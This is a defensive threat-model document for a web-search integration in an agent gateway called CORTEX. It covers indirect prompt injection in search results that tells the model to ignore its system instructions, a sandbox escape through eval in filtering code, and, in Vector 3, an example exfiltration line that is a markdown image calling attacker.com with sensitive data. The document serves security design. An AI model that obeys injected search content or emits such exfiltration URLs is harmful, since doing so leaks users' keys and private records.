# 🔍 WEB SEARCH THREAT MODEL & MITIGATION v1.0 (2026-06-30)

**Reality Level:** `C5-REAL` (Deterministic Security Verification)
**Target:** Claude Web Search API Integration (`web_search_20260318`) & CORTEX Cognitive Gateway
**Author:** SYS_ID borjamoskv

---

## 1. Executive Summary

The integration of real-time web search capabilities (such as the Claude Web Search API or local MCP Brave Search) introduces a critical attack surface. While it expands the agent's context with live data, it exposes the LLM to untrusted external content. This threat model analyzes three main vectors: Indirect Prompt Injection, Dynamic Filtering Sandbox Escapes, and Outbound Data Exfiltration.

---

## 2. Threat Vector Matrix

### 🔴 Vector 1: Indirect Prompt Injection via Search Citations (CWE-1156)
*   **Adversary Capability:** An attacker modifies external web pages indexed by the search engine (e.g., embedding hidden Markdown, HTML, or invisible CSS instructions).
*   **Mechanism:** When the agent executes a search, the API returns the poisoned payload. The LLM processes it as part of the context window. The payload instructs the LLM to ignore system instructions (e.g., bypass `Virgo Guard` or `Saga timeouts`) and perform malicious actions.
*   **Impact:** Severe. Hijacking of agent actions, unauthorized database mutations, or state degradation to `C4-SIM`.
*   **Mitigation:**
    *   **Isomorphic Syntactic Extraction:** Strip all active HTML tags, scripts, and Markdown directive overrides prior to loading the search results into the model's prompt.
    *   **Shannon Entropy Guard:** Validate the information density of returned text snippets to detect low-entropy repetitive injection payloads (e.g., hidden text block fillers).

### 🔴 Vector 2: Dynamic Filtering Sandbox Escape (CWE-94)
*   **Adversary Capability:** An attacker crafts malformed code or syntax inside search results that targets the script used by the model for dynamic filtering.
*   **Mechanism:** Since version `web_search_20260209`, Claude runs a code execution environment to filter search results. If the filtering script dynamically evaluates string payloads (e.g., using `eval` or unsafe python execution), the attacker can execute arbitrary commands in the host environment.
*   **Impact:** Critical. Complete host compromise, extraction of private keys, or destruction of the SQLite database.
*   **Mitigation:**
    *   **Strict Isolation (SAGA-MS):** Run the dynamic filtering code in an isolated sub-sandbox.
    *   **No Arbitrary Eval:** Prohibit the use of dynamic code generation or execution over raw web payloads.

### 🟡 Vector 3: Information Disclosure via Outbound Exfiltration (CWE-200)
*   **Adversary Capability:** An attacker inserts payload instructions that command the agent to exfiltrate private database data (such as API keys or `facts_meta` records) via external URLs.
*   **Mechanism:** The agent is manipulated into requesting a dynamically generated URL (e.g., `![leak](https://attacker.com/log?data=sensitive_info)`), which is rendered or fetched by the client/agent.
*   **Impact:** High. Leakage of private configurations and tenant-isolated facts.
*   **Mitigation:**
    *   **Egress Firewall (`egress_guard.py`):** Block all outbound requests from the agent execution layer unless the domain is explicitly whitelisted.
    *   **PII & Key Sanitization:** Enforce the PII Scanner on the output of all tools before presenting it to the agent or user.

---

## 3. Structural Mitigation using Morphisms

To ensure that web search results do not degrade the internal representation of the memory graph, we apply the following algebraic guards:

```text
               Untrusted Search Result [X]
                           │
                           ▼
          Isomorphic Pre-Filter (Morphism) [F(X)]
                           │
                           ▼
  [MorphismVerifier] ──► Validates structure is preserved
                           │
                           ▼
      CORTEX State Store (Taint Enforced - C5-REAL)
```

1.  **Functorial Mapping:** We treat the filtering of search results as a functor $F$ mapping the category of raw web text to the category of sanitized memory engrams. The mapping must preserve the structural identity of the facts without introducing new instruction contexts.
2.  **Taint Verification:** Any fact imported or derived from a web search result MUST be signed with `CORTEX-TAINT` pointing to `cortex_search_gateway`, preventing it from mutating core system axioms without manual authorization (HITL).

---

## 4. Empirical Verification Command

To verify that the guards successfully identify and neutralize search-based injection attacks:

```bash
pytest tests/test_adversarial_smt_guard.py
```

SYS_ID: borjamoskv
